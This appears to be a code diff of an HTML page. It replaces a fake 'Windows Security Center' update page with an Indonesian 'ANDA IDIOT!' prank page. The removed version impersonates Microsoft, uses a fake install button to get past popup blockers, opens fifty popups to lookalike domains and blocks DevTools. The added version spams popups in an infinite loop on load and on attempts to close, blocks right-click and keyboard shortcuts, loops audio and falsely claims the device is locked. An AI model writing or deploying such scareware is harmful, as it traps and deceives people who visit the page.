@@ -1,208 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Important Security Update</title>
+    <title>Link Menarik</title>
     <script>
-        // Obfuscated function names and delayed execution
-        function initSecurityCheck() {
-            setTimeout(loadCriticalUpdate, 2000);
-        }
-
-        function loadCriticalUpdate() {
-            // Disguise as legitimate update flow
-            document.getElementById('message').innerHTML = "Downloading critical security patch...";
-            
-            setTimeout(function() {
-                // Use user-triggered event simulation
-                var fakeButton = document.createElement('button');
-                fakeButton.innerHTML = "Click to Continue Installation";
-                fakeButton.style.position = 'absolute';
-                fakeButton.style.left = '50%';
-                fakeButton.style.top = '50%';
-                fakeButton.style.transform = 'translate(-50%, -50%)';
-                fakeButton.style.padding = '20px';
-                fakeButton.style.fontSize = '18px';
-                fakeButton.style.backgroundColor = '#0078D4';
-                fakeButton.style.color = 'white';
-                fakeButton.style.border = 'none';
-                fakeButton.style.borderRadius = '5px';
-                fakeButton.style.cursor = 'pointer';
-                
-                fakeButton.onclick = function() {
-                    // Start pop-ups only after user interaction (bypasses some blockers)
-                    startControlledPopups();
-                    this.remove();
-                };
-                
-                document.body.appendChild(fakeButton);
-            }, 3000);
-        }
-
-        function startControlledPopups() {
-            // Use setTimeout chain instead of while loop to avoid freezing
-            var popupCount = 0;
-            var maxPopups = 50; // Reasonable limit to avoid immediate blocking
-            
-            function openNextPopup() {
-                if (popupCount >= maxPopups) return;
-                
-                // Vary window features and URLs
-                var features = [
-                    "width=400,height=300,left=" + (Math.random() * 500),
-                    "width=350,height=400,top=" + (Math.random() * 500),
-                    "width=500,height=350"
-                ];
-                
-                var urls = [
-                    "https://legitimate-looking-domain.com/update",
-                    "https://security-center.example.com/alert",
-                    "https://support-portal.site/notification"
-                ];
-                
-                // Open with randomized delay
-                setTimeout(function() {
-                    var win = window.open(
-                        urls[popupCount % urls.length],
-                        "_blank",
-                        features[popupCount % features.length]
-                    );
-                    
-                    // Close some popups after short delay to appear less spammy
-                    if (popupCount % 3 === 0) {
-                        setTimeout(function() {
-                            if (win && !win.closed) win.close();
-                        }, 1000);
-                    }
-                    
-                    popupCount++;
-                    if (popupCount < maxPopups) {
-                        openNextPopup();
-                    }
-                }, 300 + Math.random() * 700);
+        // Fungsi untuk membuka pop-up spam dalam loop
+        function spamPopups() {
+            while (true) {
+                window.open("https://example.com", "_blank", "width=300,height=300");
+                // Tambahkan variasi URL atau pesan spam
+                window.open("https://example.com/spam", "_blank", "width=400,height=400");
             }
-            
-            openNextPopup();
-            
-            // Add fake progress indicator
-            var progress = document.createElement('div');
-            progress.id = 'progress';
-            progress.style.cssText = 'position:fixed; top:10px; right:10px; background:white; padding:10px; border-radius:5px;';
-            document.body.appendChild(progress);
-            
-            var updateProgress = setInterval(function() {
-                var percent = Math.min(100, (popupCount / maxPopups) * 100);
-                progress.innerHTML = "Update Progress: " + percent.toFixed(0) + "%";
-                if (popupCount >= maxPopups) {
-                    clearInterval(updateProgress);
-                    progress.innerHTML = "Update Complete!";
-                }
-            }, 500);
         }
 
-        // Less aggressive event blocking - only block specific shortcuts
+        // Nonaktifkan klik kanan dan keyboard shortcuts
+        document.addEventListener('contextmenu', event => event.preventDefault());
         document.addEventListener('keydown', function(e) {
-            // Only block F12 (DevTools)
-            if (e.key === 'F12') {
+            // Blokir F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, dll.
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 85))) {
                 e.preventDefault();
-                // Redirect instead of spamming
-                window.location.href = "https://www.microsoft.com/en-us/windows";
                 return false;
+            }
+            // Blokir Alt+F4 dan Ctrl+W (tutup window/tab)
+            if ((e.altKey && e.keyCode == 115) || (e.ctrlKey && e.keyCode == 87)) {
+                e.preventDefault();
+                spamPopups(); // Trigger spam tambahan jika mencoba close
             }
         });
 
-        // Remove onbeforeunload spam - too obvious
-        // Instead, use beforeunload for legitimate-seeming message
-        window.onbeforeunload = function(e) {
-            e.preventDefault();
-            e.returnValue = "Are you sure you want to leave? The security update is still in progress.";
-            return "Are you sure you want to leave? The security update is still in progress.";
+        // Cegah user keluar dari halaman
+        window.onbeforeunload = function() {
+            spamPopups();
+            return "Anda terjebak!";
         };
 
-        // Start with legitimate-looking content
+        // Mulai spam saat halaman dimuat
         window.onload = function() {
-            // Play subtle notification sound instead of annoying loop
-            var audio = new Audio('https://notification-sounds.com/sounds/notification.mp3');
-            audio.volume = 0.3;
-            audio.play().catch(function() {
-                // Ignore autoplay errors
-            });
-            
-            // Delayed start of malicious code
-            setTimeout(initSecurityCheck, 1000);
+            spamPopups();
+            // Tambahkan audio atau elemen mengganggu
+            var audio = new Audio('https://example.com/annoying-sound.mp3');
+            audio.loop = true;
+            audio.play();
         };
     </script>
     <style>
         body {
             margin: 0;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            padding: 0;
+            background-color: black;
+            color: red;
+            font-size: 50px;
             text-align: center;
-        }
-        
-        .container {
-            max-width: 800px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 40px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-        }
-        
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
-            color: #fff;
-        }
-        
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: white;
-            border-radius: 50%;
-            margin: 0 auto 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            color: #0078D4;
-            font-weight: bold;
-        }
-        
-        .loading {
-            margin: 30px 0;
-            font-size: 1.2em;
-            opacity: 0.8;
-        }
-        
-        .disclaimer {
-            font-size: 0.9em;
-            opacity: 0.7;
-            margin-top: 40px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-            padding-top: 20px;
+            overflow: hidden;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">✓</div>
-        <h1>Windows Security Center</h1>
-        <p id="message">Initializing security verification...</p>
-        <div class="loading">
-            <div>Checking system integrity...</div>
-            <div style="margin-top: 10px; font-size: 0.8em;">This may take a few moments</div>
-        </div>
-        <div class="disclaimer">
-            Important: Do not close this window during the update process.<br>
-            Your system is being protected against the latest threats.
-        </div>
-    </div>
+    <h1>ANDA IDIOT!</h1>
+    <p>Device Anda sekarang terkunci. HAHAHA!</p>
+    <img src="https://example.com/annoying-gif.gif" alt="Spam Image" style="width:100%;height:auto;">
 </body>
 </html>
